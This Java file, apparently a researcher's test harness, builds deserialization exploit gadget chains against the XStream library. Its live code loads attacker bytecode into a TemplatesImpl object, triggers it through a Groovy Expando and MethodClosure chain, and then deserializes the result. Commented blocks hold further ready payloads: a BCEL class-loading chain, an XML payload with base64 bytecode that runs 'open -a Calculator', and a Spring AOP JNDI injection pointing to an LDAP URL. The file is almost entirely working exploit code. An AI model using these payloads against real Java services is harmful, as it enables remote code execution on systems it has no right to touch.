import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.thoughtworks.xstream.XStream;
import deserialize.Test;
import groovy.util.Expando;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import java.io.*;
import java.lang.reflect.*;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.Map;


/**
 * @author huanmao.sjc
 * @version $Id: XStreamTest, v 0.1 2020-03-19 4:18 PM th1s Exp $
 */
public class XStreamTest {
    public static void main(String[] args) throws Exception {

        File file = new File("/Users/th1s/programming/java/javalearning/target/classes/BuildTest.class");
        long fileSize = file.length();
        InputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[(int) fileSize];
        fis.read(buffer);

        File file2 = new File("/tmp/test.class");
        long fileSize2 = file2.length();
        InputStream fis2 = new FileInputStream(file2);
        byte[] buffer2 = new byte[(int) fileSize2];
        fis2.read(buffer2);

//        String bcel = Utility.encode(buffer, true);
//        String className = "$$BCEL$$" + bcel;
//
//        Class class1 = Class.forName("com.sun.xml.internal.ws.util.ServiceFinder$ServiceName");
//        Object array1 = Array.newInstance(class1, 1);
//        Constructor constructor1 = class1.getDeclaredConstructors()[0];
//        constructor1.setAccessible(true);
//        Object object1 = constructor1.newInstance(new Object[] {className, new URL("http://www.baidu.com") });
//        Array.set(array1, 0, object1);
//
//        Class class2 = Class.forName("com.sun.xml.internal.ws.util.ServiceFinder$LazyIterator");
//        Constructor constructor2 = class2.getDeclaredConstructors()[1];
//        constructor2.setAccessible(true);
//        Object object2 = constructor2.newInstance(new Object[] {class2, new com.sun.org.apache.bcel.internal.util.ClassLoader()});
//
//        Field field2 = class2.getDeclaredField("names");
//        field2.setAccessible(true);
//        field2.set(object2, array1);
////        iterator.next();
//
//        Class class3 = Class.forName("javax.crypto.NullCipher");
//        Constructor constructor3 = class3.getDeclaredConstructors()[0];
//        constructor3.setAccessible(true);
//        Object object3 = constructor3.newInstance();
//        Field field3 = class3.getSuperclass().getDeclaredField("serviceIterator");
//        field3.setAccessible(true);
//        field3.set(object3, object2);
//        Field field32 = class3.getSuperclass().getDeclaredField("lock");
//        field32.setAccessible(true);
//        field32.set(object3, "1");
//        Field field33 = class3.getSuperclass().getDeclaredField("spi");
//        field33.setAccessible(true);
//        field33.set(object3, null);
//
////        Method method3 = class3.getDeclaredMethod("chooseFirstProvider");
////        method3.setAccessible(true);
////        method3.invoke(object3);
//
//        Class class4 = Class.forName("javax.crypto.CipherInputStream");
//        Constructor constructor4 = class4.getDeclaredConstructors()[1];
//        Object object4 = constructor4.newInstance(new Object[] {new ByteArrayInputStream(new byte[0]), object3});
////        ((javax.crypto.CipherInputStream)object4).read();
//
//        Class class5 = Class.forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
//        Constructor constructor5 = class5.getDeclaredConstructors()[0];
//        constructor5.setAccessible(true);
//        Object object5 = constructor5.newInstance(new Object[] {"123", object4});
//
//        DataHandler dataHandler = new DataHandler((DataSource) object5);
//
//        Class class6 = Class.forName("com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data");
//        Object object6 = class6.newInstance();
//        Field field6 = class6.getDeclaredField("dataHandler");
//        field6.setAccessible(true);
//        field6.set(object6, dataHandler);


        Class class8 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object object8 = class8.newInstance();
        Field field8 = class8.getDeclaredField("_bytecodes");
        field8.setAccessible(true);
        byte[][] _bytecodes = new byte[2][];
        _bytecodes[0] = buffer;
        _bytecodes[1] = buffer2;
        field8.set(object8, _bytecodes);
        Field field82 = class8.getDeclaredField("_name");
        field82.setAccessible(true);
        field82.set(object8, "test");
        Field field83 = class8.getDeclaredField("_tfactory");
        field83.setAccessible(true);
        field83.set(object8, new TransformerFactoryImpl());
//        Field field84 = class8.getDeclaredField("_auxClasses");
//        field84.setAccessible(true);
//        field84.set(object8, new HashMap());
        Field field85 = class8.getDeclaredField("_transletIndex");
        field85.setAccessible(true);
        field85.set(object8, 0);

//        Map map1 = new HashMap();
//        map1.put("test", object8);
//
//        Class class7 = Class.forName("com.alibaba.fastjson.JSONObject");
//        Object object7 = class7.newInstance();
//        Field field7 = class7.getDeclaredField("map");
//        field7.setAccessible(true);
//        field7.set(object7, map1);
//
//        Map map = new HashMap();
//        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(object7);
//        XString xString = new XString("test");
//        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xString);
//
//        map.put(hotSwappableTargetSource1, "123");
//        map.put(hotSwappableTargetSource2, "456");


//        String command = "open -a Calculator";
//        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");


        Class clazz0a = Class.forName("org.codehaus.groovy.runtime.MethodClosure");
        Object object0a = clazz0a.getDeclaredConstructors()[0].newInstance(new Object[] {object8, "getOutputProperties"});
//        Field field0a = clazz0a.getSuperclass().getDeclaredField("owner");
//        field0a.setAccessible(true);
//        field0a.set(object0a, object8);

        HashMap map = new HashMap();
        map.put("gen_hashCode", object0a);

        Class clazz9 = Class.forName("groovy.util.Expando");
        Object object9 = clazz9.newInstance();
        Field field9 = clazz9.getDeclaredField("expandoProperties");
        field9.setAccessible(true);
        field9.set(object9, map);

        HashMap map2 = new HashMap();
        map2.put(object9, 1);

        String xml = new XStream().toXML(map2).replace("gen_hashCode", "hashCode");
        System.out.println(xml);

        new XStream().fromXML(xml);

        XStream xStream = new XStream();


//        String xml2 = "<map>\n" +
//                "    <entry>\n" +
//                "        <groovy.util.Expando>\n" +
//                "            <expandoProperties>\n" +
//                "                <entry>\n" +
//                "                    <string>hashCode</string>\n" +
//                "                    <org.codehaus.groovy.runtime.MethodClosure>\n" +
//                "                        <delegate class=\"groovy.util.Expando\"/>\n" +
//                "                        <owner class=\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" serialization=\"custom\">\n" +
//                "                  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
//                "                    <default>\n" +
//                "                      <__name>test</__name>\n" +
//                "                      <__bytecodes>\n" +
//                "                        <byte-array>yv66vgAAADIAJQoABwAYCgAZABoIABsKABkAHAcAHQcAHgcAHwEABjxpbml0PgEAAygpVgEABENv\n" +
//                "ZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTEJ1aWxk\n" +
//                "VGVzdDsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFu\n" +
//                "Zy9TdHJpbmc7AQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEADkJ1\n" +
//                "aWxkVGVzdC5qYXZhDAAIAAkHACAMACEAIgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAIwAkAQATamF2\n" +
//                "YS9sYW5nL0V4Y2VwdGlvbgEACUJ1aWxkVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xh\n" +
//                "bmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAn\n" +
//                "KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJ\n" +
//                "AAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAACAAMAAAADAABAAAABQANAA4AAAAJ\n" +
//                "AA8AEAABAAoAAAArAAAAAQAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAADAABAAAAAQARABIAAAAI\n" +
//                "ABMACQABAAoAAABPAAIAAQAAAA64AAISA7YABFenAARLsQABAAAACQAMAAUAAwALAAAAEgAEAAAA\n" +
//                "DAAJAA8ADAANAA0AEAAMAAAAAgAAABQAAAAHAAJMBwAVAAABABYAAAACABc=</byte-array>\n" +
//                "                        <byte-array>yv66vgAAADIAEAoAAwANBwAOBwAPAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJU\n" +
//                "YWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdGVzdGZhdGhlcjsBAApTb3VyY2VG\n" +
//                "aWxlAQAPdGVzdGZhdGhlci5qYXZhDAAEAAUBAAp0ZXN0ZmF0aGVyAQAQamF2YS9sYW5nL09iamVj\n" +
//                "dAAhAAIAAwAAAAAAAQABAAQABQABAAYAAAAzAAEAAQAAAAUqtwABsQAAAAIABwAAAAoAAgAAAAcA\n" +
//                "BAAJAAgAAAAMAAEAAAAFAAkACgAAAAEACwAAAAIADA==</byte-array>\n" +
//                "                      </__bytecodes>\n" +
//                "                      <__transletIndex>0</__transletIndex>\n" +
//                "                      <__indentNumber>0</__indentNumber>\n" +
//                "                    </default>\n" +
//                "                    <boolean>false</boolean>\n" +
//                "                  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
//                "                        </owner>\n" +
//                "                        <method>getOutputProperties</method>\n" +
//                "                    </org.codehaus.groovy.runtime.MethodClosure>\n" +
//                "                </entry>\n" +
//                "            </expandoProperties>\n" +
//                "        </groovy.util.Expando>\n" +
//                "        <int>1</int>\n" +
//                "    </entry>\n" +
//                "</map>";

//        new XStream().fromXML(xml2);
//        System.out.println(xml2);
//
//
//
//
//
//        File file = new File("/tmp/test.class");
//        long fileSize = file.length();
//        InputStream fis = new FileInputStream(file);
//        byte[] buffer = new byte[(int) fileSize];
//        fis.read(buffer);
//
//        String bcel = Utility.encode(buffer, true);
//        System.out.println(bcel);
//
//        String className = "$$BCEL$$" + bcel;
//        ClassLoader classLoader = new ClassLoader();
//        Class.forName(className, true, classLoader);

//        String payload2 = "<map>\n" +
//                "  <entry>\n" +
//                "    <org.springframework.aop.target.HotSwappableTargetSource>\n" +
//                "      <target class=\"org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder\">\n" +
//                "        <advisor class=\"org.springframework.aop.aspectj.AspectJPointcutAdvisor\">\n" +
//                "          <advice class=\"org.springframework.aop.aspectj.AspectJAroundAdvice\" serialization=\"custom\">\n" +
//                "            <org.springframework.aop.aspectj.AbstractAspectJAdvice>\n" +
//                "              <default>\n" +
//                "                <argumentsIntrospected>false</argumentsIntrospected>\n" +
//                "                <declarationOrder>0</declarationOrder>\n" +
//                "                <joinPointArgumentIndex>0</joinPointArgumentIndex>\n" +
//                "                <joinPointStaticPartArgumentIndex>0</joinPointStaticPartArgumentIndex>\n" +
//                "                <aspectInstanceFactory class=\"org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory\">\n" +
//                "                  <beanFactory class=\"org.springframework.jndi.support.SimpleJndiBeanFactory\">\n" +
//                "                    <logger class=\"org.apache.commons.logging.impl.NoOpLog\"/>\n" +
//                "                    <jndiTemplate>\n" +
//                "                      <logger class=\"org.apache.commons.logging.impl.NoOpLog\"/>\n" +
//                "                    </jndiTemplate>\n" +
//                "                    <resourceRef>true</resourceRef>\n" +
//                "                    <shareableResources>\n" +
//                "                      <string>ldap://localhost:1389/obj</string>\n" +
//                "                    </shareableResources>\n" +
//                "                    <singletonObjects/>\n" +
//                "                    <resourceTypes/>\n" +
//                "                  </beanFactory>\n" +
//                "                  <name>ldap://localhost:1389/obj</name>\n" +
//                "                </aspectInstanceFactory>\n" +
//                "                <declaringClass>java.lang.Object</declaringClass>\n" +
//                "                <methodName>toString</methodName>\n" +
//                "                <parameterTypes/>\n" +
//                "              </default>\n" +
//                "            </org.springframework.aop.aspectj.AbstractAspectJAdvice>\n" +
//                "          </advice>\n" +
//                "        </advisor>\n" +
//                "      </target>\n" +
//                "    </org.springframework.aop.target.HotSwappableTargetSource>\n" +
//                "    <org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/>\n" +
//                "  </entry>\n" +
//                "  <entry>\n" +
//                "    <org.springframework.aop.target.HotSwappableTargetSource>\n" +
//                "      <target class=\"com.sun.org.apache.xpath.internal.objects.XString\">\n" +
//                "        <m__obj class=\"string\">&#x3;&#x6;&#x6;</m__obj>\n" +
//                "      </target>\n" +
//                "    </org.springframework.aop.target.HotSwappableTargetSource>\n" +
//                "    <org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/>\n" +
//                "  </entry>\n" +
//                "</map>\n" +
//                "<map>";
//        System.out.println(payload2);
//        new XStream().fromXML(payload2);




    }

    public static <T> T createProxy (final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(XStreamTest.class.getClassLoader(), allIfaces, ih));
    }
}
